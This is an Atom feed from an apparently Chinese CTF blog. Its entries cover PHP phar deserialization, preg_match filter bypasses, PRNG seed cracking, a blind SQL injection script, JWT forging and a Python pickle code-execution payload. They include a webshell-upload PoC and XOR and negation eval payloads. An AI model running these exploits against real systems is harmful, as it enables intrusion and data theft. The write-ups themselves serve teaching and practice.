<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>sakura</title>
  
  
  <link href="https://sakurahack-y.github.io/atom.xml" rel="self"/>
  
  <link href="https://sakurahack-y.github.io/"/>
  <updated>2021-10-27T14:38:46.578Z</updated>
  <id>https://sakurahack-y.github.io/</id>
  
  <author>
    <name>John Doe</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>phar反序列化漏洞</title>
    <link href="https://sakurahack-y.github.io/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/"/>
    <id>https://sakurahack-y.github.io/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</id>
    <published>2021-10-27T12:41:33.000Z</published>
    <updated>2021-10-27T14:38:46.578Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概要"><a href="#概要" class="headerlink" title="概要"></a>概要</h1><p>来自Secarma的安全研究员Sam Thomas发现了一种新的漏洞利用方式，可以在不使用php函数unserialize()的前提下，引起严重的php对象注入漏洞。<br> 这个新的攻击方式被他公开在了美国的BlackHat会议演讲上，演讲主题为：”不为人所知的php反序列化漏洞”。它可以使攻击者将相关漏洞的严重程度升级为远程代码执行。我们在RIPS代码分析引擎中添加了对这种新型攻击的检测。</p><h1 id="关于流包装"><a href="#关于流包装" class="headerlink" title="关于流包装"></a>关于流包装</h1><p>大多数PHP文件操作允许使用各种URL协议去访问文件路径：如<code>data://</code>，<code>zlib://</code>或<code>php://</code>。<br> 例如常见的</p><pre><code class="php">include(&#39;php://filter/read=convert.base64-encode/resource=index.php&#39;);include(&#39;data://text/plain;base64,xxxxxxxxxxxx&#39;);</code></pre><p><code>phar://</code>也是流包装的一种</p><h1 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h1><p>phar文件会以序列化的形式存储用户自定义的meta-data；该方法在文件系统函数（file_exists()、is_dir()等）参数可控的情况下，配合phar://伪协议，可以不依赖unserialize()直接进行反序列化操作</p><h1 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h1><p>phar由四个部分组成，分别是stub、manifest describing the  contents、 the file contents、 [optional] a signature for verifying Phar  integrity (phar file format only)</p><p>stub:标识作用，格式为xxx<?php xxx; __HALT_COMPILER();?>，前面任意，但是一定要以__HALT_COMPILER();?&gt;结尾，否则php无法识别这是一个phar文件；</p><p>manifest describing the contents:其实可以理解为phar文件本质上是一种压缩文件，其中包含有压缩信息和权限，当然我们需要利用的序列化也在里面；</p><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/d8f9d72a6059252d260b20a9a98db93d5bb5b918.jpeg" alt="img"></p><p> the file contents:这里指的是被压缩文件的内容；</p><p>[optional] a signature for verifying Phar integrity (phar file format only):签名，放在结尾；</p><p>根据文件结构我们来自己构建一个phar文件，php内置了一个Phar类来处理相关操作</p><p><strong>注意：要将php.ini中的phar.readonly选项设置为Off，否则无法生成phar文件。</strong></p><pre><code class="php">&lt;?phpclass TestObject &#123;&#125;@unlink(&quot;phar.phar&quot;);$phar = new Phar(&quot;sakura.phar&quot;); //后缀名必须为phar$phar-&gt;startBuffering(); //开始缓冲 Phar 写操作$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub$o = new TestObject();$o -&gt; data=&#39;sakura&#39;;$phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest$phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件//签名自动计算$phar-&gt;stopBuffering();?&gt;</code></pre><p>访问一下，发现同目录下生成了一个.phar后缀的文件(如果这步无法创建，请修改php.ini的配置，设置phar.readonly = off 并去掉前面的分号)</p><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20211027213811961.png" alt="image-20211027213811961"></p><p>打开：</p><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20211027215216183.png" alt="image-20211027215216183"></p><p>发现写入的内容已经被序列化。</p><p>有序列化数据必然会有反序列化操作，php一大部分的文件系统函数在通过<code>phar://</code>伪协议解析phar文件时，都会将meta-data进行反序列化，测试后受影响的函数如下：</p><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/20180908164943-2151deae-b344-1.png" alt="img"></p><h1 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h1><p>phar_fan.php</p><pre><code class="php">&lt;?phpclass TestObject&#123;    function __destruct()    &#123;        echo $this -&gt; data;   // TODO: Implement __destruct() method.    &#125;&#125;include(&#39;phar://phar.phar&#39;);?&gt;</code></pre><p><img src="/2021/10/27/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/image-20211027215532641.png" alt="image-20211027215532641"></p><p>我们来简要说明下整个调用流程：</p><p>访问 phar_fun.php这个文件</p><p>执行incleude代码</p><p>解析phar文件</p><p>将里面的meta-data反序列化，在上述代码中也就是TestObject这个对象。</p><p>对象销毁，调用魔术方法__destruct()</p><p>执行echo语句完成攻击。</p><h1 id="将phar伪造成其他格式的文件"><a href="#将phar伪造成其他格式的文件" class="headerlink" title="将phar伪造成其他格式的文件"></a>将phar伪造成其他格式的文件</h1><p>php识别phar文件是通过其文件头的stub，更确切一点来说是<code>__HALT_COMPILER();?&gt;</code>这段代码，对前面的内容或者后缀名是没有要求的。那么我们就可以通过添加任意的文件头+修改后缀名的方式将phar文件伪装成其他格式的文件。</p><pre><code class="php">&lt;?php    class TestObject &#123;    &#125;    @unlink(&quot;sakura.phar&quot;);    $phar = new Phar(&quot;sakura.phar&quot;);    $phar-&gt;startBuffering();    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub，增加gif文件头    $o = new TestObject();    $phar-&gt;setMetadata($o); //将自定义meta-data存入manifest    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件    //签名自动计算    $phar-&gt;stopBuffering();?&gt;</code></pre><p>然后调用phar://sakura.php</p><p>是一样的效果。</p><h1 id="漏洞的利用条件"><a href="#漏洞的利用条件" class="headerlink" title="漏洞的利用条件"></a>漏洞的利用条件</h1><ol><li>phar文件要能够上传到服务器端。</li><li>要有可用的魔术方法作为“跳板”。</li><li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li></ol><h1 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h1><ol><li>在文件系统函数的参数可控时，对参数进行严格的过滤。</li><li>严格检查上传文件的内容，而不是只检查文件头。</li><li>在条件允许的情况下禁用可执行系统命令、代码的危险函数。</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;概要&quot;&gt;&lt;a href=&quot;#概要&quot; class=&quot;headerlink&quot; title=&quot;概要&quot;&gt;&lt;/a&gt;概要&lt;/h1&gt;&lt;p&gt;来自Secarma的安全研究员Sam Thomas发现了一种新的漏洞利用方式，可以在不使用php函数unserialize()的前提下，引起</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="反序列化" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
    
    <category term="反序列化" scheme="https://sakurahack-y.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>preg_match正则绕过总结</title>
    <link href="https://sakurahack-y.github.io/2021/10/26/preg-match%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
    <id>https://sakurahack-y.github.io/2021/10/26/preg-match%E6%AD%A3%E5%88%99%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</id>
    <published>2021-10-26T10:19:19.000Z</published>
    <updated>2021-10-26T14:43:25.075Z</updated>
    
    <content type="html"><![CDATA[<p>最近写题遇到了很多次pre_match函数，但并不是每次都可以绕过。于是想要把这个函数总结一下用法。我个人认为preg_match的绕过方法主要取决于其正则表达式的写法。</p><p>首先对正则表达式的常见符号解释一下。</p><p>/    /    是一种格式吧，正则表达式需要写在这个里面</p><p>^：匹配输入字符串的开始位置</p><p>$：匹配输入字符串的结束位置</p><h1 id="换行符绕过-0a"><a href="#换行符绕过-0a" class="headerlink" title="换行符绕过(%0a)"></a>换行符绕过(%0a)</h1><pre><code class="php">&lt;?phpinclude(&quot;flag.php&quot;);highlight_file(__FILE__);$c = $_GET[&#39;c&#39;];if (preg_match(&#39;/^flag$/i&#39;, $c) &amp;&amp; $c !== &#39;flag&#39;) &#123;    echo $flag;&#125;else&#123;    echo &quot;nonono&quot;;&#125;</code></pre><p>由于pre_match这个函数是只能匹配一行的数据，所以我们可以用%0a(也就是换行符)来绕过。</p><p>这里是因为$会忽略换行符</p><p>因此本题我们传入?c=flag%0a  即可绕过</p><p>注意此时正则表达式的模式是: i</p><h1 id="利用数组绕过"><a href="#利用数组绕过" class="headerlink" title="利用数组绕过"></a>利用数组绕过</h1><p> preg_match只能处理字符串，当传入的subject是数组时会返回false</p><h1 id="5c绕过"><a href="#5c绕过" class="headerlink" title="%5c绕过"></a>%5c绕过</h1><pre><code class="php">&lt;?php show_source(__FILE__); $key = &quot;bad&quot;; extract($_POST);        // 使用POST接收参数 if($key === &#39;bad&#39;)&#123;        // $key 与 &#39;bad&#39; 进行比较，值不相同时才可以继续运行代码    die(&#39;badbad!!!&#39;); &#125; $act = @$_GET[&#39;act&#39;];    // 获得 act 参数 $arg = @$_GET[&#39;arg&#39;];    // 获得 arg 参数 if(preg_match(&#39;/^[a-z0-9_]*$/isD&#39;,$act)) &#123;    // 针对act参数进行过滤    echo &#39;check&#39;; &#125; else &#123;    $act($arg,&#39;&#39;);        // 动态调用 &#125; echo &#39;666&#39;;</code></pre><pre><code>/i不区分大小写/s匹配任何不可见字符，包括空格、制表符、换页符等等，等价于[fnrtv]/D如果使用$限制结尾字符,则不允许结尾有换行;</code></pre><p>这里存在/s和/D因此它会匹配到换行，%0a因此就无法绕过。这时候就可以使用%5c</p><h1 id="preg-match-“-e”-注：php版本需要小于5-5-0"><a href="#preg-match-“-e”-注：php版本需要小于5-5-0" class="headerlink" title="preg_match(“/^$/e”) (注：php版本需要小于5.5.0)"></a>preg_match(“/^$/e”) (注：php版本需要小于5.5.0)</h1><pre><code class="php">&lt;?highlight_file(__FILE__);echo preg_replace(&quot;/test/e&quot;,$_GET[&quot;h&quot;],&quot;jutst test&quot;);?&gt;</code></pre><p>payload=xx?h=phpinfo();</p><h1 id="PHP利用PCRE回溯次数限制绕过某些安全限制"><a href="#PHP利用PCRE回溯次数限制绕过某些安全限制" class="headerlink" title="PHP利用PCRE回溯次数限制绕过某些安全限制"></a>PHP利用PCRE回溯次数限制绕过某些安全限制</h1><p>poc</p><pre><code class="php">import requestsfrom io import BytesIOfiles = &#123;  &#39;file&#39;: BytesIO(b&#39;aaa&lt;?php eval($_POST[txt]);//&#39; + b&#39;a&#39; * 1000000)&#125;res = requests.post(&#39;http://51.158.75.42:8088/index.php&#39;, files=files, allow_redirects=False)print(res.headers)</code></pre><p>payload:?a=ssss………..省略n个字符，突破100万</p><h1 id="异或绕过"><a href="#异或绕过" class="headerlink" title="异或绕过"></a>异或绕过</h1><pre><code class="php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123;        $code=$_GET[&#39;code&#39;];            if(strlen($code)&gt;40)&#123;                    die(&quot;This is too Long.&quot;);                    &#125;            if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;                    die(&quot;NO.&quot;);                    &#125;            @eval($code);&#125;else&#123;        highlight_file(__FILE__);&#125;highlight_file(__FILE);// ?&gt;</code></pre><p>可以使用各种特殊字符的异或构造出字母和数字</p><p>脚本：</p><pre><code class="php">str = r&quot;~!@#$%^&amp;*()_+&lt;&gt;?,.;:-[]&#123;&#125;/&quot;for i in range(0, len(str)):    for j in range(0, len(str)):        a = ord(str[i])^ord(str[j])        print(str[i] + &#39; ^ &#39; + str[j] + &#39; is &#39; + chr(a))</code></pre><p>payload:</p><pre><code class="php">?code=$_=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$_&#125;[_]();&amp;_=phpinfo</code></pre><h1 id="取反绕过"><a href="#取反绕过" class="headerlink" title="取反绕过"></a>取反绕过</h1><p>把getFlag取反然后URL编码： </p><pre><code class="php"> &lt;?php echo urlencode(~&quot;getFlag&quot;); </code></pre><p>–&gt; %98%9A%8B%B9%93%9E%98</p><p>依据这个我们可以构造payload: </p><pre><code class="php"> ?code=$_=~%98%9A%8B%B9%93%9E%98;$_(); </code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近写题遇到了很多次pre_match函数，但并不是每次都可以绕过。于是想要把这个函数总结一下用法。我个人认为preg_match的绕过方法主要取决于其正则表达式的写法。&lt;/p&gt;
&lt;p&gt;首先对正则表达式的常见符号解释一下。&lt;/p&gt;
&lt;p&gt;/    /    是一种格式吧，正</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="常见函数" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%B8%B8%E8%A7%81%E5%87%BD%E6%95%B0/"/>
    
    
    <category term="preg_match" scheme="https://sakurahack-y.github.io/tags/preg-match/"/>
    
  </entry>
  
  <entry>
    <title>GWCTF 2019枯燥的抽奖_0x30-0x3f</title>
    <link href="https://sakurahack-y.github.io/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/"/>
    <id>https://sakurahack-y.github.io/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/</id>
    <published>2021-10-24T15:57:20.000Z</published>
    <updated>2021-10-25T05:44:21.834Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211024235829685.png" alt="image-20211024235829685"></p><p>查看源代码</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211024235901200.png" alt="image-20211024235901200"></p><p>看到一个关键点，check.php，访问一下</p><pre><code class="php"> &lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION[&#39;seed&#39;]))&#123;$_SESSION[&#39;seed&#39;]=rand(0,999999999);&#125;mt_srand($_SESSION[&#39;seed&#39;]);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#39;&#39;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123;    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       &#125;$str_show = substr($str, 0, 10);echo &quot;&lt;p id=&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST[&#39;num&#39;]))&#123;    if($_POST[&#39;num&#39;]===$str)&#123;x        echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;;    &#125;    else&#123;        echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;;    &#125;&#125;show_source(&quot;check.php&quot;); </code></pre><p>这里涉及到了伪随机数漏洞，即当确定了种子后，随机数每次生成数的所有数是重复得，并不是真正意义上的随机数。</p><pre><code class="php">&lt;?php  mt_srand(12345);    echo mt_rand().&quot;&lt;br/&gt;&quot;;?&gt;  </code></pre><p>当你每次运行这个函数得到的随机数都是相同的。</p><p>这个就像一个关系式：y=ax，如果我们能得到y和a就可以推出x。</p><p>当然，实际上这个函数的关系是十分复杂的，但我们仍然可以用工具去破解。</p><p>首先，我们要把题目给我们的线索转化为脚本可读的形式：</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211025011936452.png" alt="image-20211025011936452"></p><pre><code class="python">str1 = &#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;str2 = &#39;nngMHvCoQB&#39;res = &#39;&#39;for i in range(len(str2)):    for j in range(len(str1)):        if str2[i] == str1[j]:            res += str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;            breakprint(res)</code></pre><p>![image-20211025012020617](GWCTF-2019枯燥的抽奖-0x30-0x3f/image-20211025012020617.png</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/Kali-Linux-2021.3-vmware-amd64-2021-10-25-01-20-39.png" alt="Kali-Linux-2021.3-vmware-amd64-2021-10-25-01-20-39"></p><p>获得到了种子，我们来生成下后序的字符串：</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211025012917063.png" alt="image-20211025012917063"></p><p>我们看到前面十位完全吻合。</p><p>提交：</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211025013042600.png" alt="image-20211025013042600"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211024235829685.png&quot; alt=&quot;image-202110242</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="伪随机数" scheme="https://sakurahack-y.github.io/tags/%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"/>
    
  </entry>
  
  <entry>
    <title>WUSTCTF2020 颜值成绩查询_0x21-0x2F</title>
    <link href="https://sakurahack-y.github.io/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/"/>
    <id>https://sakurahack-y.github.io/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/</id>
    <published>2021-10-22T06:50:41.000Z</published>
    <updated>2021-10-22T06:55:50.285Z</updated>
    
    <content type="html"><![CDATA[<p>进去只有一个简单得输入框，测试下是否存在sql注入</p><p><img src="/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/image-20211022145243657.png" alt="image-20211022145243657"></p><p>先输入1，2，3等</p><p>发现有数据显示</p><p>使用异或</p><p><a href="http://fba65ac4-7e1e-4c73-bb3b-35bfdef68f71.node4.buuoj.cn:81/?stunum=0%5E1">http://fba65ac4-7e1e-4c73-bb3b-35bfdef68f71.node4.buuoj.cn:81/?stunum=0^1</a></p><p>结果显示得是stunum=1的界面</p><p>说明存在sql盲注</p><p>写一个简单脚本：</p><pre><code>import requestsimport timeurl = &quot;http://fba65ac4-7e1e-4c73-bb3b-35bfdef68f71.node4.buuoj.cn:81/&quot;data= &quot;&quot;for i in range(10000):    min = 32    max = 128    while (min &lt; max) :        mid = (min + max) // 2    # 爆破数据库名        #payload = &quot;?stunum=0^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)&quot;%(i,mid)    # 爆破表名        #payload = &quot;?stunum=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)&quot;%(i,mid)    # 爆破字段        #payload = &quot;?stunum=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),%d,1))&gt;%d)&quot;%(i,mid)    # 爆破数据        payload = &quot;?stunum=0^(ascii(substr((select(group_concat(value))from(flag)),%d,1))&gt;%d)&quot;%(i,mid)        urls = url+payload        print(urls)        response = requests.get(url=urls)        time.sleep(0.2)        if &quot;Hi admin, your score is: 100&quot; in response.text:            min = mid+1        else:            max = mid        mid = (min + max) // 2    data += chr(mid)    print(data)</code></pre><p><img src="/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/image-20211022145433880.png" alt="image-20211022145433880"></p><p>写这个脚本花了挺长时间，原因是对sql注入语句还不熟练，容易被括号迷惑，看晕。</p><p>以后要注重写代码的能力。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;进去只有一个简单得输入框，测试下是否存在sql注入&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/image</summary>
      
    
    
    
    <category term="CTF" scheme="https://sakurahack-y.github.io/categories/CTF/"/>
    
    <category term="刷题" scheme="https://sakurahack-y.github.io/categories/CTF/%E5%88%B7%E9%A2%98/"/>
    
    
    <category term="SQL" scheme="https://sakurahack-y.github.io/tags/SQL/"/>
    
  </entry>
  
  <entry>
    <title>CISCN2019 华北赛区 Day1 Web2 ikun_0x10-0x1F</title>
    <link href="https://sakurahack-y.github.io/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/"/>
    <id>https://sakurahack-y.github.io/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/</id>
    <published>2021-10-20T15:35:31.000Z</published>
    <updated>2021-10-20T15:57:31.863Z</updated>
    
    <content type="html"><![CDATA[<p>一打开页面，很魔性。。</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020233731895.png" alt="image-20211020233731895"></p><p>先注册个账号</p><p>下面提示一定要买到lv6</p><p>翻了好几面，没有找到，于是写了一个简单的爬虫脚本：S</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234222133.png" alt="image-20211020234222133"></p><p>注意爬虫要慢一点，buu很容易崩。</p><pre><code class="python">import urllib.requestimport timefor i in range(0,1000):    url = &#39;http://272059db-2e14-4adc-ae85-8f5a64a35acb.node4.buuoj.cn:81/shop?page=&#39;+str(i)    print(url)    time.sleep(1)    response = urllib.request.urlopen(url).read().decode(&#39;utf-8&#39;)    if &#39;lv6.png&#39; in response:        print(i)        break</code></pre><p>发现在181面</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234439410.png" alt="image-20211020234439410"></p><p>不过钱却不太够，用burp抓下包试一试</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234524015.png" alt="image-20211020234524015"></p><p>发现discount=0.8，将它改小</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234610565.png" alt="image-20211020234610565"></p><p>发现只允许admin登录</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234638452.png" alt="image-20211020234638452"></p><p>仔细分析下数据包，发现了jwt，解一下码：</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235006767.png" alt="image-20211020235006767"></p><p>爆破一下（感觉这个挺靠运气和字典吧）</p><p>发现密钥为 1Kun</p><p>重新生成admin的jwt</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235300543.png" alt="image-20211020235300543"></p><p>查看源代码:</p><p>在这里发现源码泄露：</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235354388.png" alt="image-20211020235354388"></p><p>下载下来，找到一个叫admin.py的文件，打开</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235429287.png" alt="image-20211020235429287"></p><p>看到了pickle，查阅资料可知：</p><p>假设你有一个字典，你想存储它，稍后再取出来。你可以把它的内容写入一个文件，小心翼翼地确保使用了正确地格式，要把它读取出来，你可以使用 exec() 或处理文件输入。但是这种方法并不可靠：如果你使用纯文本来存储重要数据，数据很容易以多种方式被破坏或者修改，导致你的程序崩溃，更糟糕的情况下，还可能在你的计算机上运行恶意代码。因此，我们要pickle它:</p><pre><code>import pickledata = &#123;&#39;foo&#39;: [1,2,3],                &#39;bar&#39;: (&#39;Hello&#39;, &#39;world!&#39;),                &#39;baz&#39;: True&#125;jar = open(&#39;data.pkl&#39;, &#39;wb&#39;)pickle.dump(data, jar) # 将pickle后的数据写入jar文件jar.close()</code></pre><p>过了几个小时，我们想把它取出来，我们只需要反pickle它:</p><pre><code>import picklepkl_file = open(&#39;data.pkl&#39;, &#39;rb&#39;) # 与pickle后的数据连接data = pickle.load(pkl_file) # 把它加载进一个变量print datapkl_file.close()</code></pre><p>将会发生什么？正如你期待的，它就是我们之前的 data 。</p><p>现在，还需要谨慎地说一句：  pickle并不完美。Pickle文件很容易因为事故或被故意的破坏掉。Pickling或许比纯文本文件安全一些，但是依然有可能被用来运行恶意代码。而且它还不支持跨Python版本，所以不要指望分发pickle对象之后所有人都能正确地读取。然而不管怎么样，它依然是一个强有力的工具，可以用于缓存和其他类型的持久化工作。</p><h3 id="11-13-2-Pickle你的对象"><a href="#11-13-2-Pickle你的对象" class="headerlink" title="11.13.2. Pickle你的对象"></a><a href="http://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html#id53">11.13.2. Pickle你的对象</a></h3><p>Pickle不仅仅可以用于内建类型，任何遵守pickle协议的类都可以被pickle。Pickle协议有四个可选方法，可以让类自定义它们的行为（这和C语言扩展略有不同，那不在我们的讨论范围之内）。</p><ul><li> <strong>getinitargs</strong>(self)</li></ul><p>  如果你想让你的类在反pickle时调用 <strong>init</strong> ，你可以定义__getinitargs__(self) ，它会返回一个参数元组，这个元组会传递给__init__ 。注意，这个方法只能用于旧式类。</p><ul><li> <strong>getnewargs</strong>(self)</li></ul><p>  对新式类来说，你可以通过这个方法改变类在反pickle时传递给 <strong>new</strong> 的参数。这个方法应该返回一个参数元组。</p><ul><li> <strong>getstate</strong>(self)</li></ul><p>  你可以自定义对象被pickle时被存储的状态，而不使用对象的 <strong>dict</strong> 属性。 这个状态在对象被反pickle时会被 <strong>setstate</strong> 使用。</p><ul><li> <strong>setstate</strong>(self)</li></ul><p>  当一个对象被反pickle时，如果定义了 <strong>setstate</strong> ，对象的状态会传递给这个魔法方法，而不是直接应用到对象的 <strong>dict</strong> 属性。这个魔法方法和__getstate__ 相互依存：当这两个方法都被定义时，你可以在Pickle时使用任何方法保存对象的任何状态。</p><ul><li> <strong>reduce</strong>(self)</li></ul><p>  当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 <strong>reduce</strong> 被定义之后，当对象被Pickle时就会被调用。它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用；被传递给 <strong>setstate</strong> 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）；</p><ul><li> <strong>reduce_ex</strong>(self)</li></ul><p>  <strong>reduce_ex</strong> 的存在是为了兼容性。如果它被定义，在pickle时__reduce_ex__ 会代替 <strong>reduce</strong> 被调用。 <strong>reduce</strong> 也可以被定义，用于不支持 <strong>reduce_ex</strong> 的旧版pickle的API调用。</p><p>这里构造payload,传给become：</p><pre><code>import pickleimport urllibclass payload(object):    def __reduce__(self):       return (eval, (&quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&quot;,))a = pickle.dumps(payload())a = urllib.quote(a)print a</code></pre><p><img 